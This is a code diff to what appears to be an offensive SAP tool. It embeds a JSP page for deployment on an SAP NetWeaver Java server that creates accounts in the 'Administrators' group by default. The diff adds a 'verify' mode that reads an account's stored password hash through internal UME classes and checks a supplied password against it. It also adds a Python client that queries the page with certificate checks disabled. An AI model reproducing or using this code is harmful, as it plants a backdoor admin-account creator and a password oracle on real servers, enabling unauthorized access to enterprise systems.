@@ -102,6 +102,7 @@ def ume_password_check(hash_str: str, password: str) -> bool:
 # Output is a simple `key=value` format so the caller can parse deterministically.
 UME_CREATE_JSP = r'''<%@ page contentType="text/plain" %>
 <%
+String mode      = request.getParameter("mode");
 String uname     = request.getParameter("user");
 String pass      = request.getParameter("pass");
 String firstname = request.getParameter("firstname");
@@ -114,12 +115,56 @@ if (pass == null)      pass = "";
 if (firstname == null) firstname = "SAPMAP";
 if (lastname == null)  lastname = uname;
 if (group == null)     group = "Administrators";
+if (mode == null)      mode = "create";
 
 try {
     Class<?> UMF = Class.forName("com.sap.security.api.UMFactory");
     Object uaf = UMF.getMethod("getUserAccountFactory").invoke(null);
     Object uf  = UMF.getMethod("getUserFactory").invoke(null);
     Object gf  = UMF.getMethod("getGroupFactory").invoke(null);
+
+    // ---- verify mode: confirm (uname, pass) authenticates -------------------
+    // Looks up the stored j_password hash for the account and asks the
+    // server's PasswordHash.checkHash() to validate — this is what the
+    // HTTP logon path does internally, so matching means real login works.
+    if ("verify".equals(mode)) {
+        try {
+            Object acct = uaf.getClass()
+                .getMethod("getUserAccountByLogonId", String.class)
+                .invoke(uaf, uname);
+            if (acct == null) { out.println("status=not_found"); return; }
+            String[] vals = (String[]) acct.getClass()
+                .getMethod("getAttribute", String.class, String.class)
+                .invoke(acct, "com.sap.security.core.usermanagement", "j_password");
+            if (vals == null || vals.length == 0 || vals[0] == null) {
+                out.println("status=no_hash"); return;
+            }
+            String storedHash = vals[0];
+            Class<?> PH = Class.forName("com.sap.security.core.util.imp.PasswordHash");
+            java.lang.reflect.Constructor<?> c2 = null;
+            for (java.lang.reflect.Constructor<?> c : PH.getDeclaredConstructors()) {
+                if (c.getParameterTypes().length == 2) { c2 = c; c2.setAccessible(true); break; }
+            }
+            Object ph = c2.newInstance(uname, pass);
+            boolean ok = (Boolean) PH.getMethod("checkHash", String.class)
+                .invoke(ph, storedHash);
+            out.println("status=" + (ok ? "ok" : "wrong_password"));
+            out.println("userid=" + acct.getClass()
+                .getMethod("getUniqueID").invoke(acct));
+        } catch (Throwable vt) {
+            Throwable vc = vt;
+            while (vc.getCause() != null) vc = vc.getCause();
+            if (vc.getClass().getSimpleName().contains("NoSuch") ||
+                vc.getClass().getSimpleName().contains("NotFound")) {
+                out.println("status=not_found");
+            } else {
+                out.println("status=error");
+                out.println("error=" + vc.getClass().getSimpleName()
+                    + ": " + vc.getMessage());
+            }
+        }
+        return;
+    }
 
     // Already exists?
     String userId = null;
@@ -204,6 +249,44 @@ def _java_root_path(sid: str, instance_nr: int) -> str:
 # ---------------------------------------------------------------------------
 # JSP invocation (common to both deployment paths)
 # ---------------------------------------------------------------------------
+
+def verify_user_logon(jsp_url: str, username: str, password: str,
+                       timeout: float = 15.0) -> dict:
+    """Ask the deployed JSP to validate (username, password) against the
+    stored UME hash — equivalent to checking whether a real HTTP login
+    would succeed, without actually touching the login flow.
+
+    Returns dict: {success, status, userid, error}.
+      status == "ok"             → credentials match
+      status == "wrong_password" → user exists, password is different
+      status == "not_found"      → no such user
+    """
+    params = {"mode": "verify", "user": username, "pass": password}
+    qs = urllib.parse.urlencode(params)
+    ctx = ssl._create_unverified_context()
+    req = urllib.request.Request(f"{jsp_url}?{qs}",
+                                   headers={"User-Agent": _UA})
+    result = {"success": False, "status": "", "userid": "", "error": ""}
+    try:
+        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
+            text = r.read().decode("latin1", errors="replace")
+    except urllib.error.HTTPError as e:
+        result["error"] = f"HTTP {e.code}"
+        return result
+    except (urllib.error.URLError, TimeoutError, OSError) as e:
+        result["error"] = str(e)
+        return result
+    for line in text.splitlines():
+        if "=" not in line:
+            continue
+        k, v = line.split("=", 1)
+        k = k.strip().lower()
+        v = v.strip()
+        if k in result:
+            result[k] = v
+    result["success"] = result["status"] == "ok"
+    return result
+
 
 def invoke_create_user_jsp(jsp_url: str, username: str, password: str,
                              firstname: str = "SAPMAP", lastname: str = None,
